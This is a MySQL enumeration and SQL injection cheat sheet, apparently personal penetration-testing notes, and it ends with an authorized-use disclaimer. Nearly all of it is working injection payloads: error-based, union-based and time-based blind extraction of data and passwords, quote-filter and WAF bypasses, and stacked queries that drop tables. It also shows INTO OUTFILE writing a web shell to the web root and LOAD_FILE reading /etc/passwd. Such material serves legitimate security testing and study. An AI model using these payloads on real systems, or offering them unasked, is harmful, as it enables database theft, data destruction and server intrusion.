# MySQL Enumeration & SQL Injection Cheat Sheet (VAPT Research Notes)

> Personal research notes for authorized VAPT / lab practices.

---

## 1. Schema Reference

| Object | Type | Purpose |
|---|---|---|
| `information_schema` | System schema | ANSI metadata: TABLES, COLUMNS, SCHEMATA |
| `mysql` | System database | Users, privileges, server config |
| `performance_schema` | System schema | Runtime performance metrics |
| `sys` | System schema (5.7+) | Human-friendly views over performance_schema |

> In MySQL, "schema" and "database" are synonyms.

### Key metadata tables (information_schema)
```sql
information_schema.SCHEMATA
information_schema.TABLES
information_schema.COLUMNS
information_schema.PROCESSLIST
information_schema.USER_PRIVILEGES
information_schema.ROUTINES
mysql.user           -- requires privileges
```

### Naming convention
```sql
database_name.table_name
```

---

## 2. Basic Recon Syntax

```sql
SELECT @@version;                       -- DB version
SELECT VERSION();                       -- Same, function form
SELECT database();                      -- Current database
SELECT current_user();                  -- Current logged-in user (user@host)
SELECT user();                          -- Same
SELECT @@hostname;                      -- Server hostname
SELECT @@datadir;                       -- Data directory path
SELECT COUNT(*) FROM table_name;        -- Row count
SELECT schema_name FROM information_schema.SCHEMATA;   -- List databases
```

---

## 3. Enumerating Databases

```sql
SELECT schema_name FROM information_schema.SCHEMATA;
SHOW DATABASES;
SELECT DISTINCT table_schema FROM information_schema.TABLES;
```

---

## 4. Enumerating Tables

```sql
SELECT table_name FROM information_schema.TABLES WHERE table_schema = database();
SELECT table_name FROM information_schema.TABLES WHERE table_schema = 'target_db';
SHOW TABLES;
SHOW TABLES FROM target_db;
```

---

## 5. Enumerating Columns

```sql
SELECT column_name FROM information_schema.COLUMNS WHERE table_name = 'users';
SELECT column_name FROM information_schema.COLUMNS WHERE table_name = 'users' AND table_schema = 'target_db';
SHOW COLUMNS FROM users;
DESCRIBE users;
```

---

## 6. Dumping Records

```sql
SELECT * FROM target_db.users;               -- database_name.table_name
SELECT * FROM Persons WHERE ID = 1;
SELECT * FROM Persons LIMIT 10;               -- "TOP 10" equivalent
SELECT * FROM Persons LIMIT 1 OFFSET 5;       -- pagination for blind extraction
```

---

## 7. Error-Based Injection

MySQL error-based extraction commonly abuses `EXTRACTVALUE()`, `UPDATEXML()`, or duplicate-key errors via `GROUP BY` (the classic "floor/rand" trick).

### EXTRACTVALUE (XPath syntax error leaks data — limited to 32 chars)
```sql
SELECT EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())));
SELECT EXTRACTVALUE(1, CONCAT(0x7e, (SELECT current_user())));
```

### UPDATEXML (same idea, different function)
```sql
SELECT UPDATEXML(1, CONCAT(0x7e, (SELECT database())), 1);
```

### Duplicate entry / GROUP BY + RAND() trick (classic, works when above are patched/filtered)
```sql
SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2)) AS x
FROM information_schema.TABLES GROUP BY x;
```

### Enumerate database names one by one
```sql
SELECT EXTRACTVALUE(1, CONCAT(0x7e,
  (SELECT schema_name FROM information_schema.SCHEMATA LIMIT 1 OFFSET 0)
));
```

### Enumerate table names one by one
```sql
SELECT EXTRACTVALUE(1, CONCAT(0x7e,
  (SELECT table_name FROM information_schema.TABLES WHERE table_schema=database() LIMIT 1 OFFSET 0)
));
```

> Note: `EXTRACTVALUE`/`UPDATEXML` truncate output at 32 characters — combine with `SUBSTRING()` to read longer strings in chunks.

---

## 8. Union-Based Injection

```sql
SELECT username, password FROM users WHERE username='' UNION SELECT NULL, version();
SELECT username, password FROM users WHERE username='' UNION SELECT NULL, database();
SELECT username, password FROM users WHERE username='' UNION SELECT NULL, table_name FROM information_schema.TABLES;
SELECT username, password FROM users WHERE username='' UNION SELECT NULL, group_concat(table_name) FROM information_schema.TABLES WHERE table_schema=database();
```

> `GROUP_CONCAT()` is very useful in MySQL union injection — it merges multiple rows into a single string, reducing the number of requests needed.

---

## 9. Time-Based Blind Injection

```sql
SELECT IF(1=1, SLEEP(5), 0);
SELECT SLEEP(5) WHERE database() = 'target_db';
SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END;
```

### Extracting data character-by-character
```sql
SELECT IF(SUBSTRING((SELECT user()),1,1) = 'r', SLEEP(5), 0);
SELECT IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 100, SLEEP(5), 0);
```

---

## 10. Hex Encoding Output

```sql
SELECT HEX('Kaif');
SELECT HEX((SELECT database()));
SELECT UNHEX('4B616966');               -- reverse: hex back to string
SELECT 0x4B616966;                      -- hex literal, MySQL auto-interprets as string/bytes
```

### Bypassing quote filters using hex literals
```sql
SELECT * FROM users WHERE username = 0x61646d696e;   -- 0x61646d696e = 'admin', no quotes needed
```

---

## 11. Additional Techniques Worth Testing

### Stacked queries
Supported depending on the client/driver (many web apps use libraries that disable multi-statements by default):
```sql
'; DROP TABLE test_table--
'; INSERT INTO users VALUES (1,'x','y')--
```

### INTO OUTFILE / LOAD_FILE (requires FILE privilege + secure_file_priv not restrictive)
```sql
SELECT 'shell code' INTO OUTFILE '/var/www/html/shell.php';
SELECT LOAD_FILE('/etc/passwd');
```

### Comment syntax
```sql
--  (needs trailing space)
#   (single-line, MySQL-specific)
/* */ (multi-line)
```

### Bypassing WAFs / filters
```sql
SELECT/**/username/**/FROM/**/users;     -- inline comments as whitespace substitute
SELECT username FROM users WHERE 1=1-- -
```

### Privilege / user enumeration
```sql
SELECT user, host FROM mysql.user;
SHOW GRANTS FOR CURRENT_USER();
```

---

## Disclaimer

These notes are for authorized security testing and educational purposes only — use exclusively against systems you own or have explicit written permission to test.
